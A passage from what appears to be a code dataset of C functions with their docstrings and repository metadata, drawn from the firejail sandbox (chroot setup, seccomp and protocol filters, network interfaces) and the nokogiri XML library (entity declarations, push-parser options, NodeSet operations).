{\n\t\t\t\tfound = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tfree(scratch);\n\treturn found;\n}", "path": "firejail/src/firejail/paths.c", "commit_date": "2020-09-28 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// build /run/firejail directory\n", "func_signal": "void preproc_build_firejail_dir(void)", "code": "{\n\tstruct stat s;\n\n\t// CentOS 6 doesn't have /run directory\n\tif (stat(RUN_FIREJAIL_BASEDIR, &s)) {\n\t\tcreate_empty_dir_as_root(RUN_FIREJAIL_BASEDIR, 0755);\n\t}\n\n\tif (stat(RUN_FIREJAIL_DIR, &s)) {\n\t\tcreate_empty_dir_as_root(RUN_FIREJAIL_DIR, 0755);\n\t}\n\n\tif (stat(RUN_FIREJAIL_NETWORK_DIR, &s)) {\n\t\tcreate_empty_dir_as_root(RUN_FIREJAIL_NETWORK_DIR, 0755);\n\t}\n\n\tif (stat(RUN_FIREJAIL_BANDWIDTH_DIR, &s)) {\n\t\tcreate_empty_dir_as_root(RUN_FIREJAIL_BANDWIDTH_DIR, 0755);\n\t}\n\n\tif (stat(RUN_FIREJAIL_NAME_DIR, &s)) {\n\t\tcreate_empty_dir_as_root(RUN_FIREJAIL_NAME_DIR, 0755);\n\t}\n\n\tif (stat(RUN_FIREJAIL_PROFILE_DIR, &s)) {\n\t\tcreate_empty_dir_as_root(RUN_FIREJAIL_PROFILE_DIR, 0755);\n\t}\n\n\tif (stat(RUN_FIREJAIL_X11_DIR, &s)) {\n\t\tcreate_empty_dir_as_root(RUN_FIREJAIL_X11_DIR, 0755);\n\t}\n\n\tif (stat(RUN_FIREJAIL_DBUS_DIR, &s)) {\n\t\tcreate_empty_dir_as_root(RUN_FIREJAIL_DBUS_DIR, 0755);\n\t\tif (arg_debug)\n\t\t\tprintf(\"Remounting the \" RUN_FIREJAIL_DBUS_DIR\n\t\t\t\t   \" directory as noexec\\n\");\n\t\tif (mount(RUN_FIREJAIL_DBUS_DIR, RUN_FIREJAIL_DBUS_DIR, NULL,\n\t\t\t\t  MS_BIND, NULL) == -1)\n\t\t\terrExit(\"mounting \" RUN_FIREJAIL_DBUS_DIR);\n\t\tif (mount(NULL, RUN_FIREJAIL_DBUS_DIR, NULL,\n\t\t\t\t  MS_REMOUNT | MS_BIND | MS_NOSUID | MS_NOEXEC | MS_NODEV,\n\t\t\t\t  \"mode=755,gid=0\") == -1)\n\t\t\terrExit(\"remounting \" RUN_FIREJAIL_DBUS_DIR);\n\t}\n\n\tif (stat(RUN_FIREJAIL_APPIMAGE_DIR, &s)) {\n\t\tcreate_empty_dir_as_root(RUN_FIREJAIL_APPIMAGE_DIR, 0755);\n\t}\n\n\tif (stat(RUN_FIREJAIL_LIB_DIR, &s)) {\n\t\tcreate_empty_dir_as_root(RUN_FIREJAIL_LIB_DIR, 0755);\n\t}\n\n\tif (stat(RUN_MNT_DIR, &s)) {\n\t\tcreate_empty_dir_as_root(RUN_MNT_DIR, 0755);\n\t}\n\n\tcreate_empty_file_as_root(RUN_RO_FILE, S_IRUSR);\n\tcreate_empty_dir_as_root(RUN_RO_DIR, S_IRUSR);\n}", "path": "firejail/src/firejail/preproc.c", "commit_date": "2020-09-01 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// wait for a link-local IPv6 address for DHCPv6\n// ex: firejail --net=br0 --ip6=dhcp\n", "func_signal": "void net_if_waitll(const char *ifname)", "code": "{\n\t// find interface index\n\tint inet6_sock = socket(PF_INET6, SOCK_DGRAM, IPPROTO_IP);\n\tif (inet6_sock < 0) {\n\t\tfprintf(stderr, \"Error fnet: IPv6 is not supported on this system\\n\");\n\t\texit(1);\n\t}\n\tstruct ifreq ifr;\n\tmemset(&ifr, 0, sizeof(ifr));\n\tstrncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);\n\tifr.ifr_addr.sa_family = AF_INET;\n\tif (ioctl(inet6_sock, SIOGIFINDEX, &ifr) < 0) {\n\t\tperror(\"ioctl SIOGIFINDEX\");\n\t\texit(1);\n\t}\n\tclose(inet6_sock);\n\tif (ifr.ifr_ifindex < 0) {\n\t\tfprintf(stderr, \"Error fnet: interface index is negative\\n\");\n\t\texit(1);\n\t}\n\tuint32_t index = (uint32_t) ifr.ifr_ifindex;\n\n\t// poll for link-local address\n\tint netlink_sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);\n\tif (netlink_sock < 0)\n\t\terrExit(\"socket\");\n\tint tries = 0;\n\tint found = 0;\n\twhile (tries < 60 && !found) {\n\t\tif (tries >= 1)\n\t\t\tusleep(500000);\n\n\t\tfound = net_netlink_if_has_ll(netlink_sock, index);\n\n\t\ttries++;\n\t}\n\tclose(netlink_sock);\n\n\tif (!found) {\n\t\tfprintf(stderr, \"Waiting for link-local IPv6 address of %s timed out\\n\", ifname);\n\t\texit(1);\n\t}\n}", "path": "firejail/src/fnet/interface.c", "commit_date": "2020-01-27 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// default list\n", "func_signal": "void seccomp_default(const char *fname, int allow_debuggers, bool native)", "code": "{\n\tassert(fname);\n\n\t// open file\n\tint fd = open(fname, O_CREAT|O_WRONLY|O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);\n\tif (fd < 0) {\n\t\tfprintf(stderr, \"Error fseccomp: cannot open %s file\\n\", fname);\n\t\texit(1);\n\t}\n\n\t// build filter (no post-exec filter needed because default list is fine for us)\n\tfilter_init(fd, native);\n\tadd_default_list(fd, allow_debuggers, native);\n\tfilter_end_blacklist(fd);\n\n\t// close file\n\tclose(fd);\n}", "path": "firejail/src/fseccomp/seccomp.c", "commit_date": "2020-04-06 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// return 1 if found\n", "func_signal": "static int storage_find(Storage *ptr, const char *name)", "code": "{\n\twhile (ptr) {\n\t\tif (strcmp(ptr->name, name) == 0)\n\t\t\treturn 1;\n\t\tptr = ptr->next;\n\t}\n\n\treturn 0;\n}", "path": "firejail/src/fldd/main.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// add a veth device to a bridge\n", "func_signal": "void net_bridge_add_interface(const char *bridge, const char *dev)", "code": "{\n\tcheck_if_name(bridge);\n\tcheck_if_name(dev);\n\n\t// somehow adding the interface to the bridge resets MTU on bridge device!!!\n\t// workaround: restore MTU on the bridge device\n\t// todo: put a real fix in\n\tint mtu1 = net_get_mtu(bridge);\n\n\tstruct ifreq ifr;\n\tint err;\n\tint ifindex = if_nametoindex(dev);\n\n\tif (ifindex <= 0)\n\t\terrExit(\"if_nametoindex\");\n\n\tint sock;\n\tif ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)\n              \terrExit(\"socket\");\n\n\tmemset(&ifr, 0, sizeof(ifr));\n\tstrncpy(ifr.ifr_name, bridge, IFNAMSIZ - 1);\n#ifdef SIOCBRADDIF\n\tifr.ifr_ifindex = ifindex;\n\terr = ioctl(sock, SIOCBRADDIF, &ifr);\n\tif (err < 0)\n#endif\n\t{\n\t\tunsigned long args[4] = { BRCTL_ADD_IF, ifindex, 0, 0 };\n\n\t\tifr.ifr_data = (char *) args;\n\t\terr = ioctl(sock, SIOCDEVPRIVATE, &ifr);\n\t}\n\t(void) err;\n\tclose(sock);\n\n\tint mtu2 = net_get_mtu(bridge);\n\tif (mtu1 != mtu2)\n\t\tnet_set_mtu(bridge, mtu1);\n}", "path": "firejail/src/fnet/interface.c", "commit_date": "2020-01-27 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// copy /etc/resolv.conf or /etc/machine-id in chroot directory\n", "func_signal": "static void update_file(int parentfd, const char *relpath)", "code": "{\n\tassert(relpath && relpath[0] && relpath[0] != '/');\n\n\tchar *abspath;\n\tif (asprintf(&abspath, \"/%s\", relpath) == -1)\n\t\terrExit(\"asprintf\");\n\tint in = open(abspath, O_RDONLY|O_CLOEXEC);\n\tfree(abspath);\n\tif (in == -1)\n\t\tgoto errout;\n\n\tstruct stat src;\n\tif (fstat(in, &src) == -1)\n\t\terrExit(\"fstat\");\n\t// try to detect if file has been bind mounted into the chroot\n\tstruct stat dst;\n\tif (fstatat(parentfd, relpath, &dst, 0) == 0) {\n\t\tif (src.st_dev == dst.st_dev && src.st_ino == dst.st_ino) {\n\t\t\tclose(in);\n\t\t\treturn;\n\t\t}\n\t}\n\tif (arg_debug)\n\t\tprintf(\"Updating chroot /%s\\n\", relpath);\n\tunlinkat(parentfd, relpath, 0);\n\tint out = openat(parentfd, relpath, O_WRONLY|O_CREAT|O_EXCL|O_CLOEXEC, S_IRUSR | S_IWRITE | S_IRGRP | S_IROTH);\n\tif (out == -1) {\n\t\tclose(in);\n\t\tgoto errout;\n\t}\n\tif (sendfile(out, in, NULL, src.st_size) == -1)\n\t\terrExit(\"sendfile\");\n\tclose(in);\n\tclose(out);\n\treturn;\n\nerrout:\n\tfwarning(\"chroot /%s not initialized\\n\", relpath);\n}", "path": "firejail/src/firejail/chroot.c", "commit_date": "2020-10-01 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// returns 1 if fails, 0 if OK\n", "func_signal": "static int copy_line(FILE *fpout, char *buf, char *ptr)", "code": "{\n\t// fpout: GROUP_FILE\n\t// buf: pulse:x:115:netblue,bingo\n\t// ptr: 115:neblue,bingo\n\n\twhile (*ptr != ':' && *ptr != '\\0')\n\t\tptr++;\n\tif (*ptr == '\\0')\n\t\treturn 1;\n\n\tptr++;\n\tif (*ptr == '\\n' || *ptr == '\\0') {\n\t\tfprintf(fpout, \"%s\", buf);\n\t\treturn 0;\n\t}\n\n\t// print what we have so far\n\tchar tmp = *ptr;\n\t*ptr = '\\0';\n\tfprintf(fpout, \"%s\", buf);\n\t*ptr = tmp;\n\n\t// tokenize\n\tchar *token = strtok(ptr, \",\\n\");\n\tint first = 1;\n\twhile (token) {\n\t\tchar *newtoken = strtok(NULL, \",\\n\");\n\t\tif (ulist_find(token)) {\n\t\t\t//skip\n\t\t\ttoken = newtoken;\n\t\t\tcontinue;\n\t\t}\n\t\tif (!first)\n\t\t\tfprintf(fpout, \",\");\n\t\tfirst = 0;\n\t\tfprintf(fpout, \"%s\", token);\n\t\ttoken = newtoken;\n\t}\n\tfprintf(fpout, \"\\n\");\n\treturn 0;\n}", "path": "firejail/src/firejail/restrict_users.c", "commit_date": "2020-07-29 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// chroot into an existing directory; mount existing /dev and update /etc/resolv.conf\n", "func_signal": "void fs_chroot(const char *rootdir)", "code": "{\n\tassert(rootdir);\n\n\t// fails if there is any symlink or if rootdir is not a directory\n\tint parentfd = safe_fd(rootdir, O_PATH|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC);\n\tif (parentfd == -1)\n\t\terrExit(\"safe_fd\");\n\t// rootdir has to be owned by root and is not allowed to be generally writable,\n\t// this also excludes /tmp and friends\n\tstruct stat s;\n\tif (fstat(parentfd, &s) == -1)\n\t\terrExit(\"fstat\");\n\tif (s.st_uid != 0) {\n\t\tfprintf(stderr, \"Error: chroot directory should be owned by root\\n\");\n\t\texit(1);\n\t}\n\tif (((S_IWGRP|S_IWOTH) & s.st_mode) != 0) {\n\t\tfprintf(stderr, \"Error: only root user should be given write permission on chroot directory\\n\");\n\t\texit(1);\n\t}\n\t// check chroot subdirectories; /tmp/.X11-unix and /run are treated separately\n\tcheck_subdir(parentfd, \"dev\", 0);\n\tcheck_subdir(parentfd, \"etc\", 1);\n\tcheck_subdir(parentfd, \"proc\", 0);\n\tcheck_subdir(parentfd, \"tmp\", 0);\n\tcheck_subdir(parentfd, \"var\", 1);\n\tcheck_subdir(parentfd, \"var/tmp\", 0);\n\n\t// mount-bind a /dev in rootdir\n\tif (arg_debug)\n\t\tprintf(\"Mounting /dev on chroot /dev\\n\");\n\t// open chroot /dev to get a file descriptor,\n\t// then use this descriptor as a mount target\n\tint fd = openat(parentfd, \"dev\", O_PATH|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC);\n\tif (fd == -1)\n\t\terrExit(\"open\");\n\tchar *proc;\n\tif (asprintf(&proc, \"/proc/self/fd/%d\", fd) == -1)\n\t\terrExit(\"asprintf\");\n\tif (mount(\"/dev\", proc, NULL, MS_BIND|MS_REC, NULL) < 0)\n\t\terrExit(\"mounting /dev\");\n\tfree(proc);\n\tclose(fd);\n\n\t// x11\n\t// if users want this mount, they should set FIREJAIL_CHROOT_X11\n\tif (getenv(\"FIREJAIL_X11\") || getenv(\"FIREJAIL_CHROOT_X11\")) {\n\t\tif (arg_debug)\n\t\t\tprintf(\"Mounting /tmp/.X11-unix on chroot /tmp/.X11-unix\\n\");\n\t\tcheck_subdir(parentfd, \"tmp/.X11-unix\", 0);\n\t\tfd = openat(parentfd, \"tmp/.X11-unix\", O_PATH|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC);\n\t\tif (fd == -1)\n\t\t\terrExit(\"open\");\n\t\tif (asprintf(&proc, \"/proc/self/fd/%d\", fd) == -1)\n\t\t\terrExit(\"asprintf\");\n\t\tif (mount(\"/tmp/.X11-unix\", proc, NULL, MS_BIND|MS_REC, NULL) < 0)\n\t\t\terrExit(\"mounting /tmp/.X11-unix\");\n\t\tfree(proc);\n\t\tclose(fd);\n\t}\n\n\t// some older distros don't have a /run directory, create one by default\n\tif (mkdirat(parentfd, \"run\", 0755) == -1 && errno != EEXIST)\n\t\terrExit(\"mkdir\");\n\tcheck_subdir(parentfd, \"run\", 1);\n\n\t// pulseaudio; only support for default directory /run/user/$UID/pulse\n\tif (getenv(\"FIREJAIL_CHROOT_PULSE\")) {\n\t\tchar *pulse;\n\t\tif (asprintf(&pulse, \"%s/run/user/%d/pulse\", cfg.chrootdir, getuid()) == -1)\n\t\t\terrExit(\"asprintf\");\n\t\tchar *orig_pulse = pulse + strlen(cfg.chrootdir);\n\n\t\tif (arg_debug)\n\t\t\tprintf(\"Mounting %s on chroot %s\\n\", orig_pulse, orig_pulse);\n\t\tint src = safe_fd(orig_pulse, O_PATH|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC);\n\t\tif (src == -1) {\n\t\t\tfprintf(stderr, \"Error: cannot open %s\\n\", orig_pulse);\n\t\t\texit(1);\n\t\t}\n\t\tint dst = safe_fd(pulse, O_PATH|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC);\n\t\tif (dst == -1) {\n\t\t\tfprintf(stderr, \"Error: cannot open %s\\n\", pulse);\n\t\t\texit(1);\n\t\t}\n\t\tfree(pulse);\n\n\t\tchar *proc_src, *proc_dst;\n\t\tif (asprintf(&proc_src, \"/proc/self/fd/%d\", src) == -1)\n\t\t\terrExit(\"asprintf\");\n\t\tif (asprintf(&proc_dst, \"/proc/self/fd/%d\", dst) == -1)\n\t\t\terrExit(\"asprintf\");\n\t\tif (mount(proc_src, proc_dst, NULL, MS_BIND|MS_REC, NULL) < 0)\n\t\t\terrExit(\"mount bind\");\n\t\tfree(proc_src);\n\t\tfree(proc_dst);\n\t\tclose(src);\n\t\tclose(dst);\n\n\t\t// update /etc/machine-id in chroot\n\t\tupdate_file(parentfd, \"etc/machine-id\");\n\t}\n\n\t// create /run/firejail directory in chroot\n\tif (mkdirat(parentfd, &RUN_FIREJAIL_DIR[1], 0755) == -1 && errno != EEXIST)\n\t\terrExit(\"mkdir\");\n\tcheck_subdir(parentfd, &RUN_FIREJAIL_DIR[1], 1);\n\n\t// create /run/firejail/lib directory in chroot\n\tif (mkdirat(parentfd, &RUN_FIREJAIL_LIB_DIR[1], 0755) == -1 && errno != EEXIST)\n\t\terrExit(\"mkdir\");\n\tcheck_subdir(parentfd, &RUN_FIREJAIL_LIB_DIR[1], 1);\n\t// mount lib directory into the chroot\n\tfd = openat(parentfd, &RUN_FIREJAIL_LIB_DIR[1], O_PATH|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC);\n\tif (fd == -1)\n\t\terrExit(\"open\");\n\tif (asprintf(&proc, \"/proc/self/fd/%d\", fd) == -1)\n\t\terrExit(\"asprintf\");\n\tif (mount(RUN_FIREJAIL_LIB_DIR, proc, NULL, MS_BIND|MS_REC, NULL) < 0)\n\t\terrExit(\"mount bind\");\n\tfree(proc);\n\tclose(fd);\n\n\t// create /run/firejail/mnt directory in chroot\n\tif (mkdirat(parentfd, &RUN_MNT_DIR[1], 0755) == -1 && errno != EEXIST)\n\t\terrExit(\"mkdir\");\n\tcheck_subdir(parentfd, &RUN_MNT_DIR[1], 1);\n\t// mount the current mnt directory into the chroot\n\tfd = openat(parentfd, &RUN_MNT_DIR[1], O_PATH|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC);\n\tif (fd == -1)\n\t\terrExit(\"open\");\n\tif (asprintf(&proc, \"/proc/self/fd/%d\", fd) == -1)\n\t\terrExit(\"asprintf\");\n\tif (mount(RUN_MNT_DIR, proc, NULL, MS_BIND|MS_REC, NULL) < 0)\n\t\terrExit(\"mount bind\");\n\tfree(proc);\n\tclose(fd);\n\n\t// update chroot resolv.conf\n\tupdate_file(parentfd, \"etc/resolv.conf\");\n\n#ifdef HAVE_GCOV\n\t__gcov_flush();\n#endif\n\t// create /run/firejail/mnt/oroot\n\tchar *oroot = RUN_OVERLAY_ROOT;\n\tif (mkdir(oroot, 0755) == -1)\n\t\terrExit(\"mkdir\");\n\t// mount the chroot dir on top of /run/firejail/mnt/oroot in order to reuse the apparmor rules for overlay\n\tif (asprintf(&proc, \"/proc/self/fd/%d\", parentfd) == -1)\n\t\terrExit(\"asprintf\");\n\tif (mount(proc, oroot, NULL, MS_BIND|MS_REC, NULL) < 0)\n\t\terrExit(\"mounting rootdir oroot\");\n\tfree(proc);\n\tclose(parentfd);\n\t// chroot into the new directory\n\tif (arg_debug)\n\t\tprintf(\"Chrooting into %s\\n\", rootdir);\n\tif (chroot(oroot) < 0)\n\t\terrExit(\"chroot\");\n\n\t// mount a new proc filesystem\n\tif (arg_debug)\n\t\tprintf(\"Mounting /proc filesystem representing the PID namespace\\n\");\n\tif (mount(\"proc\", \"/proc\", \"proc\", MS_NOSUID | MS_NOEXEC | MS_NODEV | MS_REC, NULL) < 0)\n\t\terrExit(\"mounting /proc\");\n\n\t// create all other /run/firejail files and directories\n\tpreproc_build_firejail_dir();\n\n\t// update /var directory in order to support multiple sandboxes running on the same root directory\n\t//\tif (!arg_private_dev)\n\t//\t\tfs_dev_shm();\n\tfs_var_lock();\n\tif (!arg_keep_var_tmp)\n\t        fs_var_tmp();\n\tif (!arg_writable_var_log)\n\t\tfs_var_log();\n\n\tfs_var_lib();\n\tfs_var_cache();\n\tfs_var_utmp();\n\tfs_machineid();\n\n\t// don't leak user information\n\trestrict_users();\n\n\t// when starting as root, firejail config is not disabled;\n\tif (getuid() != 0)\n\t\tdisable_config();\n}", "path": "firejail/src/firejail/chroot.c", "commit_date": "2020-10-01 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// install protocol filter\n", "func_signal": "void protocol_build_filter(const char *prlist, const char *fname)", "code": "{\n\tassert(prlist);\n\tassert(fname);\n\n#ifndef SYS_socket\n\tif (!arg_quiet)\n\t\tfprintf(stderr, \"Warning fseccomp: --protocol not supported on this platform\\n\");\n\treturn;\n#else\n\t// build the filter\n\tstruct sock_filter filter[32];\t// big enough\n\tmemset(&filter[0], 0, sizeof(filter));\n\tuint8_t *ptr = (uint8_t *) &filter[0];\n\n\t// header\n\tstruct sock_filter filter_start[] = {\n#if defined __x86_64__\n\t\t/* check for native arch */\n\t\tBPF_STMT(BPF_LD+BPF_W+BPF_ABS, (offsetof(struct seccomp_data, arch))),\n\t\tBPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, ARCH_NR, 1 + 2 + 1, 0),\n\t\t/* i386 filter */\n\t\tEXAMINE_SYSCALL, // 1\n\t\t// checking SYS_socket only: filtering SYS_socketcall not possible with seccomp\n\t\tONLY(359), // 1 + 2\n\t\tBPF_JUMP(BPF_JMP+BPF_JA+BPF_K, (3 + 1 + 2), 0, 0), // 1 + 2 + 1\n#else\n#warning 32 bit protocol filter not implemented yet for your architecture\n#endif\n\t\tVALIDATE_ARCHITECTURE, // 3\n\t\tEXAMINE_SYSCALL, // 3 + 1\n\t\tONLY(SYS_socket), // 3 + 1 + 2\n\n\t\tEXAMINE_ARGUMENT(0) // 3 + 1 + 2 + 1\n\t};\n\tmemcpy(ptr, &filter_start[0], sizeof(filter_start));\n\tptr += sizeof(filter_start);\n\n\t// parse list and add commands\n\tchar *tmplist = strdup(prlist);\n\tif (!tmplist)\n\t\terrExit(\"strdup\");\n\tchar *token = strtok(tmplist, \",\");\n\tif (!token)\n\t\terrExit(\"strtok\");\n\n\twhile (token) {\n\t\tstruct sock_filter *domain = find_protocol_domain(token);\n\t\tif (domain == NULL) {\n\t\t\tfprintf(stderr, \"Error fseccomp: %s is not a valid protocol\\n\", token);\n\t\t\texit(1);\n\t\t}\n\t\tmemcpy(ptr, domain, whitelist_len * sizeof(struct sock_filter));\n\t\tptr += whitelist_len * sizeof(struct sock_filter);\n\t\ttoken = strtok(NULL, \",\");\n\t}\n\tfree(tmplist);\n\n\t// add end of filter\n\tstruct sock_filter filter_end[] = {\n\t\tRETURN_ERRNO(ENOTSUP)\n\t};\n\tmemcpy(ptr, &filter_end[0], sizeof(filter_end));\n\tptr += sizeof(filter_end);\n\n\t// save filter to file\n\tint dst = open(fname, O_CREAT|O_WRONLY|O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);\n\tif (dst < 0) {\n\t\tfprintf(stderr, \"Error fseccomp: cannot open %s file\\n\", fname);\n\t\texit(1);\n\t}\n\n\tint size = (int) ((uintptr_t) ptr - (uintptr_t) (filter));\n\tint written = 0;\n\twhile (written < size) {\n\t\tint rv = write(dst, (unsigned char *) filter + written, size - written);\n\t\tif (rv == -1) {\n\t\t\tfprintf(stderr, \"Error fseccomp: cannot write %s file\\n\", fname);\n\t\t\texit(1);\n\t\t}\n\t\twritten += rv;\n\t}\n\tclose(dst);\n#endif // SYS_socket\n}", "path": "firejail/src/fseccomp/protocol.c", "commit_date": "2020-10-28 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "/*\n * call-seq:\n *  system_id\n *\n * Get the URI for a SYSTEM or PUBLIC Entity\n */\n", "func_signal": "static VALUE system_id(VALUE self)", "code": "{\n  xmlEntityPtr node;\n  Data_Get_Struct(self, xmlEntity, node);\n\n  if(!node->SystemID) return Qnil;\n\n  return NOKOGIRI_STR_NEW2(node->SystemID);\n}", "path": "nokogiri/ext/nokogiri/xml_entity_decl.c", "commit_date": "2010-04-07 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  replace_entities=(boolean)\n *\n * Should this parser replace entities?  &amp; will get converted to '&' if\n * set to true\n */\n", "func_signal": "static VALUE set_replace_entities(VALUE self, VALUE value)", "code": "{\n  xmlParserCtxtPtr ctx;\n  Data_Get_Struct(self, xmlParserCtxt, ctx);\n\n  if (Qfalse == value) {\n    ctx->replaceEntities = 0;\n  } else {\n    ctx->replaceEntities = 1;\n  }\n\n  return value;\n}", "path": "nokogiri/ext/nokogiri/xml_sax_push_parser.c", "commit_date": "2017-01-15 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  replace_entities\n *\n * Should this parser replace entities?  &amp; will get converted to '&' if\n * set to true\n */\n", "func_signal": "static VALUE get_replace_entities(VALUE self)", "code": "{\n  xmlParserCtxtPtr ctx;\n  Data_Get_Struct(self, xmlParserCtxt, ctx);\n\n  if (0 == ctx->replaceEntities) {\n    return Qfalse;\n  } else {\n    return Qtrue;\n  }\n}", "path": "nokogiri/ext/nokogiri/xml_sax_push_parser.c", "commit_date": "2017-01-15 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  original_content\n *\n * Get the original_content before ref substitution\n */\n", "func_signal": "static VALUE original_content(VALUE self)", "code": "{\n  xmlEntityPtr node;\n  Data_Get_Struct(self, xmlEntity, node);\n\n  if(!node->orig) return Qnil;\n\n  return NOKOGIRI_STR_NEW2(node->orig);\n}", "path": "nokogiri/ext/nokogiri/xml_entity_decl.c", "commit_date": "2010-04-07 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  to_a\n *\n * Return this list as an Array\n */\n", "func_signal": "static VALUE to_array(VALUE self)", "code": "{\n  xmlNodeSetPtr node_set ;\n  VALUE list;\n  int i;\n\n  Data_Get_Struct(self, xmlNodeSet, node_set);\n\n  list = rb_ary_new2(node_set->nodeNr);\n  for(i = 0; i < node_set->nodeNr; i++) {\n    VALUE elt = Nokogiri_wrap_xml_node_set_node(node_set->nodeTab[i], self);\n    rb_ary_push( list, elt );\n  }\n\n  return list;\n}", "path": "nokogiri/ext/nokogiri/xml_node_set.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  entity_type\n *\n * Get the entity type\n */\n", "func_signal": "static VALUE entity_type(VALUE self)", "code": "{\n  xmlEntityPtr node;\n  Data_Get_Struct(self, xmlEntity, node);\n\n  return INT2NUM((int)node->etype);\n}", "path": "nokogiri/ext/nokogiri/xml_entity_decl.c", "commit_date": "2010-04-07 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  initialize_native(xml_sax, filename)\n *\n * Initialize the push parser with +xml_sax+ using +filename+\n */\n", "func_signal": "static VALUE initialize_native(VALUE self, VALUE _xml_sax, VALUE _filename)", "code": "{\n  xmlSAXHandlerPtr sax;\n  const char * filename = NULL;\n  xmlParserCtxtPtr ctx;\n\n  Data_Get_Struct(_xml_sax, xmlSAXHandler, sax);\n\n  if (_filename != Qnil) { filename = StringValueCStr(_filename); }\n\n  ctx = xmlCreatePushParserCtxt(\n          sax,\n          NULL,\n          NULL,\n          0,\n          filename\n        );\n  if (ctx == NULL) {\n    rb_raise(rb_eRuntimeError, \"Could not create a parser context\");\n  }\n\n  ctx->userData = NOKOGIRI_SAX_TUPLE_NEW(ctx, self);\n\n  ctx->sax2 = 1;\n  DATA_PTR(self) = ctx;\n  return self;\n}", "path": "nokogiri/ext/nokogiri/xml_sax_push_parser.c", "commit_date": "2017-01-15 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  &(node_set)\n *\n * Set Intersection \u2014 Returns a new NodeSet containing nodes common to the two NodeSets.\n */\n", "func_signal": "static VALUE intersection(VALUE self, VALUE rb_other)", "code": "{\n  xmlNodeSetPtr node_set, other ;\n  xmlNodeSetPtr intersection;\n\n  if(!rb_obj_is_kind_of(rb_other, cNokogiriXmlNodeSet))\n    rb_raise(rb_eArgError, \"node_set must be a Nokogiri::XML::NodeSet\");\n\n  Data_Get_Struct(self, xmlNodeSet, node_set);\n  Data_Get_Struct(rb_other, xmlNodeSet, other);\n\n  intersection = xmlXPathIntersection(node_set, other);\n  return Nokogiri_wrap_xml_node_set(intersection, rb_iv_get(self, \"@document\"));\n}", "path": "nokogiri/ext/nokogiri/xml_node_set.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  dup\n *\n * Duplicate this NodeSet. Note that the Nodes contained in the NodeSet are not\n * duplicated (similar to how Array and other Enumerable classes work).\n */\n", "func_signal": "static VALUE duplicate(VALUE self)", "code": "{\n  xmlNodeSetPtr node_set;\n  xmlNodeSetPtr dupl;\n\n  Data_Get_Struct(self, xmlNodeSet, node_set);\n\n  dupl = xmlXPathNodeSetMerge(NULL, node_set);\n\n  return Nokogiri_wrap_xml_node_set(dupl, rb_iv_get(self, \"@document\"));\n}", "path": "nokogiri/ext/nokogiri/xml_node_set.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
